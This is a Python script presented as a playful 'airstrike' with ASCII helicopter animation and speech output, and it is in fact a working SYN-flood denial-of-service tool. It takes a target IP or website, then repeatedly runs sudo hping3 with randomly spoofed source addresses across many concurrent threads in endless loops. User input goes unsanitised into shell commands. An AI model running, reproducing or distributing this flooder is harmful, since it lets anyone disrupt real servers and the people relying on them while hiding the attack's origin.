import os
import random 
import time
from threading import Thread
import pyttsx3
import signal
def handler(signum, frame):
	os.system("clear")
	print("Exiting...")
	exit()
signal.signal(signal.SIGINT, handler)
ip = input("IP (or website): ")
firepower = input("TNT power in pounds: ")
miss = input("Helicopters with bombs to send: ")
i = 0
synthesizer = pyttsx3.init()
synthesizer.say("Airstrike launched onto " + str(ip)) 
synthesizer.runAndWait() 
synthesizer.stop()
def test6():	
	while True:
		os.system("clear")
		print("""
   -----|-----
*>=====[_]L)
      -'-`-
      
      
 
 
 
_______/-----------""")
		time.sleep(0.5) #1
		os.system("clear")
		print("""
     -----|-----
  *>=====[_]L)
        -'-`-
          |
         
       
 
 
_______/-----------""")
		time.sleep(0.5) #2
		os.system("clear")
		print("""
       -----|-----
    *>=====[_]L)
          -'-`-
          
          |
       
 
                   
_______/-----------""")
		time.sleep(0.5) #3
		os.system("clear")
		print("""
         -----|----
      *>=====[_]L)
            -'-`-
          
          
          |
 
                   
_______/-----------""")
		time.sleep(0.5) #4
		os.system("clear")
		print("""
           -----|--
        *>=====[_]L
              -'-`-
          
          
          
          |
                   
_______/-----------""")
		time.sleep(0.5) #5
		os.system("clear")
		print("""
             -----|
          *>=====[_
                -'-
          
          
          
          
          |         
_______/-----------""")
		time.sleep(0.5) #6
		os.system("clear")
		print("""
               ----
            *>=====
                  -
          
          
          
          
                   
_______/-----------""")
		time.sleep(0.5) #7
		os.system("clear")
		print("""
                 --
              *>===
                  
          
          
          
          
                   
_______/-----------""")
		time.sleep(0.5) #8 
		os.system("clear")
		print("""
                   
                *>=
                  
          
          
          
          
                   
_______/-----------""")
		time.sleep(0.5) #9
		os.system("clear")
		print("""
                   
                  *
                  
          
          
          
          
                   
_______/-----------""")
		time.sleep(0.5) #10
		a = random.randrange(1, 255)
		b = random.randrange(1, 255)
		c = random.randrange(1, 255)
		d = random.randrange(1, 255)
		spoofed = str(a) + "." + str(b) + "." + str(c) + "." + str(d)
		os.system("sudo hping3 -S " + ip + " -a " + spoofed + " -c " + firepower + " -q --faster >/dev/null 2>&1")
		os.system("clear")
		print("""
                   
           _____       
          /     \  
         |       |
          \_____/
            |||
            |||
            |||       
_______/-----------""")
		time.sleep(1)
		os.system("clear")
		print("""
                   
           _____       
         _/     \_ 
        |_       _|
          \_____/
            |||
            |||
            |||       
_______/-----------""")
		time.sleep(1)
		os.system("clear")
		print("""
                   
           _____       
        __/     \__
       |__       __|
          \_____/
            |||
            |||
            |||       
_______/-----------""")
		time.sleep(1)
		os.system("clear") # 13
		print("""
                   
           __ __       
        _ /     \ _
        _         _ 
          \__ __/
            | |
            | |
            | |       
_______/-----------""")
		time.sleep(1)
		os.system("clear") 
		print("""
                   
                  
 airstrike complete        
                  
          
            
            
                
_______/-----------""")
		time.sleep(6)
		os.system("clear") 



def test1():
	while True:
		time.sleep(5)
		a = random.randrange(1, 255)
		b = random.randrange(1, 255)
		c = random.randrange(1, 255)
		d = random.randrange(1, 255)
		spoofed = str(a) + "." + str(b) + "." + str(c) + "." + str(d)
		os.system("sudo hping3 -S " + ip + " -a " + spoofed + " -c " + firepower + " -q --faster >/dev/null 2>&1")
		time.sleep(10)
while i < int(miss):
	i = i + 1		
	Thread(target = test1).start() 
Thread(target = test6).start() 